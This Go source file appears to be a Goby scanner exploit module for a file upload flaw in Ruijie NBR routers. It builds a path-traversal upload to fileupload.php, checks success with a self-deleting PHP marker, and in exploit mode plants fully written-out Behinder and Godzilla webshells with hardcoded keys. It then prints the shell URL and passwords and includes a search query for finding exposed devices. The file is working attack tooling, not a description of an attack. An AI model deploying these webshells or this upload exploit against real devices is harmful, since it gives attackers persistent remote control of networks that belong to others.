package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Ruijie NBR router fileupload.php File Upload Vulnerability",
    "Description": "<p>Ruijie NBR series is a router developed by Ruijie.</p><p>Ruijie NBR routers have file upload vulnerabilities, attackers can arbitrarily execute vulnerabilities on the server-side code, write backdoors, allow server permissions, and control the web server.</p>",
    "Product": "Ruijie-Network",
    "Homepage": "https://www.ruijie.com.cn",
    "DisclosureDate": "2022-03-23",
    "Author": "1171373465@qq.com",
    "FofaQuery": "body=\"/resource/resource.php?a=c\"",
    "GobyQuery": "body=\"/resource/resource.php?a=c\"",
    "Level": "3",
    "Impact": "<p>Attackers can arbitrarily execute vulnerabilities in server-side code, write backdoors, give server permissions, and take control of web servers.</p>",
    "Recommendation": "<p>Vendor has released fixes, please pay attention to update: <a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\";?>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "锐捷 NBR 路由器 fileupload.php 文件上传漏洞",
            "Product": "锐捷网络",
            "Description": "<p>锐捷 NBR 系列是由锐捷开发的一个路由器。</p><p>锐捷 NBR 路由器存在文件上传漏洞，攻击者可以任意在服务器端代码执行漏洞，编写后门，让服务器权限，并控制 web 服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a><br></p>",
            "Impact": "<p>攻击者可以任意在服务器端代码执行漏洞，编写后门，让服务器权限，并控制 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Ruijie NBR router fileupload.php File Upload Vulnerability",
            "Product": "Ruijie-Network",
            "Description": "<p>Ruijie NBR series is a router developed by Ruijie.</p><p>Ruijie NBR routers have file upload vulnerabilities, attackers can arbitrarily execute vulnerabilities on the server-side code, write backdoors, allow server permissions, and control the web server.</p>",
            "Recommendation": "<p>Vendor has released fixes, please pay attention to update: <a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a><br></p>",
            "Impact": "<p>Attackers can arbitrarily execute vulnerabilities in server-side code, write backdoors, give server permissions, and take control of web servers.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-11",
    "PocId": "10820"
}`

	sendPayloaded649a1e := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/ddi/server/fileupload.php?uploadDir=../../ddi&name=" + filename)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Disposition", "form-data; name=\"file\"; filename=\"0.php\"")
		cfg.Data = content
		rsp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || strings.Contains(rsp.Utf8Html, "false") {
			return nil, err
		}

		cfgCheck := httpclient.NewGetRequestConfig("/ddi/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".php"
			rsp, err := sendPayloaded649a1e(u, filename, "<?php @error_reporting(0);echo \""+checkString+"\";unlink(__FILE__);?>")
			if err != nil || rsp == nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkString) && !strings.Contains(rsp.Utf8Html, "<?php")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".php"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
			}
			rsp, err := sendPayloaded649a1e(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
